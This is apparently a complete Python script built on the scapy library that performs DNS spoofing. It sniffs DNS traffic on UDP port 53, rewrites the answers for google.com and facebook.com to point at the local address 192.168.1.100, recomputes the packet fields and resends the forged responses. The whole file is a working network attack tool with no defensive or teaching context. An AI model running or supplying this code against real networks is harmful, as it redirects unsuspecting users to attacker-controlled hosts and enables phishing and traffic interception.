import logging as log
from scapy.all import *

class DnsSnoof:
    def __init__(self, hostDict):
        self.hostDict = hostDict

    def __call__(self):
        log.info("Spoofing....")
        sniff(filter="udp and port 53", prn=self.callBack)

    def callBack(self, packet):
        if packet.haslayer(DNSRR):
            try:
                log.info(f'[original] {packet[DNSRR].summary()}')
                queryName = packet[DNSQR].qname
                if queryName in self.hostDict:
                    packet[DNS].an = DNSRR(rrname=queryName, rdata=self.hostDict[queryName])
                    packet[DNS].ancount = 1
                    del packet[IP].len
                    del packet[IP].chksum
                    del packet[UDP].len
                    del packet[UDP].chksum
                    log.info(f'[modified] {packet[DNSRR].summary()}')
                    send(packet)
                else:
                    log.info(f'[not modified] {packet[DNSRR].rdata}')
            except IndexError as error:
                log.error(error)


if __name__ == '__main__':
    try:
        hostDict = {
            b"google.com.": "192.168.1.100",
            b"facebook.com.": "192.168.1.100"
        }
        log.basicConfig(format='%(asctime)s - %(message)s', level=log.INFO)
        snoof = DnsSnoof(hostDict)
        snoof()
    except OSError as error:
        log.error(error)
